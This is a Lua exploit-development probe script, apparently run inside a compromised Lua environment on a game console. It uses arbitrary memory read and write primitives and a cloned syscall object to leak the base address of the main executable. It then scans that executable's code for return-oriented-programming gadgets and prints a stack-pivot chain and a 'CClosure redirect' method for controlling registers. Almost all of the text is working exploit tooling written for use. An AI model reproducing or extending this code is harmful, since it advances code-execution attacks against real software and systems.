-- CRASH_CLASS: LOW
-- PROBE 123i: Fast compound gadget scan — targeted approach
--
-- 123h timed out scanning 2MB. New approach: scan 256KB chunks,
-- only look for the specific 4-byte pattern XX 31 C0 C3 as a
-- single dword comparison, which is much faster.

print("=== PROBE 123i: FAST COMPOUND GADGET SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo)), hi, lo
    end
    return nil, 0, 0
end

collectgarbage("stop")

local eboot_base, eboot_hi, eboot_lo = get_eboot_base()
print(string.format("[*] eboot base: 0x%08X_%08X", eboot_hi, eboot_lo))
if not eboot_base then print("ABORT") return end

local function ea(off)
    local lo = eboot_lo + off
    local hi = eboot_hi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return uint64(string.format("0x%X%08X", hi, lo))
end

-- Known gadget check
local known_xor = safe_rd(ea(0x471))
print(string.format("[*] eboot+0x471 bytes: 0x%08X (expect xor eax,eax;ret = xxC3C031)",
    known_xor or 0))

local pop_names = {
    [0x58] = "pop_rax", [0x59] = "pop_rcx", [0x5A] = "pop_rdx",
    [0x5B] = "pop_rbx", [0x5D] = "pop_rbp", [0x5E] = "pop_rsi",
    [0x5F] = "pop_rdi",
}

-- FAST SCAN: Look for dwords that contain the pattern XX 31 C0 C3
-- This is: (pop_opcode) | (0x31 << 8) | (0xC0 << 16) | (0xC3 << 24)
-- = 0xC3C031XX where XX is a pop opcode

-- Build target dwords for each pop
local targets = {}
for opcode, name in pairs(pop_names) do
    local dw = opcode + 0x31 * 256 + 0xC0 * 65536 + 0xC3 * 16777216
    targets[dw] = {name = name, opcode = opcode}
end

-- Also: leave;ret = C9 C3 as part of a dword
-- And: pop rbp;ret = 5D C3

print("")
print("--- Scanning first 2MB (dword-aligned only) ---")
print("")

local compound_hits = {}
local leave_hits = {}
local pop_rbp_first = nil

for off = 0, 0x200000 - 4, 4 do
    local dw = safe_rd(ea(off))
    if dw == nil then break end

    -- Check for compound: XX 31 C0 C3 at aligned position
    if targets[dw] then
        compound_hits[#compound_hits + 1] = {off, targets[dw].name}
    end

    -- Check for compound at off+1: byte1=pop, byte2=0x31, byte3=0xC0, byte4(next dw byte0)=0xC3
    -- dw bytes: b0 POP 31 C0 → need next dw b0 = C3
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256
    if pop_names[b1] and b2 == 0x31 and b3 == 0xC0 then
        local next_dw = safe_rd(ea(off + 4))
        if next_dw and (next_dw % 256) == 0xC3 then
            compound_hits[#compound_hits + 1] = {off + 1, pop_names[b1]}
        end
    end

    -- Check at off+2: b2=pop, b3=0x31, next_b0=0xC0, next_b1=0xC3
    if pop_names[b2] and b3 == 0x31 then
        local next_dw = safe_rd(ea(off + 4))
        if next_dw then
            local nb0 = next_dw % 256
            local nb1 = math.floor(next_dw / 256) % 256
            if nb0 == 0xC0 and nb1 == 0xC3 then
                compound_hits[#compound_hits + 1] = {off + 2, pop_names[b2]}
            end
        end
    end

    -- Check at off+3: b3=pop, next=31 C0 C3
    if pop_names[b3] then
        local next_dw = safe_rd(ea(off + 4))
        if next_dw then
            local nb0 = next_dw % 256
            local nb1 = math.floor(next_dw / 256) % 256
            local nb2 = math.floor(next_dw / 65536) % 256
            if nb0 == 0x31 and nb1 == 0xC0 and nb2 == 0xC3 then
                compound_hits[#compound_hits + 1] = {off + 3, pop_names[b3]}
            end
        end
    end

    -- leave;ret (C9 C3)
    local b0 = dw % 256
    if b0 == 0xC9 and b1 == 0xC3 then
        leave_hits[#leave_hits + 1] = off
    end
    if b1 == 0xC9 and b2 == 0xC3 then
        leave_hits[#leave_hits + 1] = off + 1
    end

    -- pop rbp;ret (5D C3) — first only
    if not pop_rbp_first then
        if b0 == 0x5D and b1 == 0xC3 then pop_rbp_first = off end
        if b1 == 0x5D and b2 == 0xC3 then pop_rbp_first = off + 1 end
    end
end

-- Print compound results
print("=== COMPOUND GADGETS (pop REG; xor eax,eax; ret) ===")
print(string.format("[*] Found %d compound gadgets:", #compound_hits))
for _, hit in ipairs(compound_hits) do
    print(string.format("  *** eboot+0x%06X: %s; xor eax,eax; ret ***", hit[1], hit[2]))
end

-- Print leave;ret
print("")
print(string.format("[*] leave;ret: %d instances", #leave_hits))
if #leave_hits > 0 then
    for i = 1, math.min(5, #leave_hits) do
        print(string.format("  eboot+0x%X", leave_hits[i]))
    end
end

-- Print pop rbp
print(string.format("[*] pop rbp;ret: %s",
    pop_rbp_first and string.format("eboot+0x%X", pop_rbp_first) or "NOT FOUND"))

-- Summary
print("")
print("=== GADGET CATALOG UPDATE ===")
if #compound_hits > 0 then
    print("[*] *** COMPOUND GADGETS FOUND ***")
    print("[*] These pop a register AND zero eax, so CClosure redirect")
    print("[*] returns cleanly without corrupting the Lua output stream!")
    print("[*] This enables OBSERVABLE register control per call.")
end
if #leave_hits > 0 and pop_rbp_first then
    print("")
    print("[*] *** STACK PIVOT AVAILABLE ***")
    print(string.format("[*]   pop rbp;ret at eboot+0x%X", pop_rbp_first))
    print(string.format("[*]   leave;ret  at eboot+0x%X", leave_hits[1]))
end

print("")
print("=== PROBE 123i COMPLETE ===")
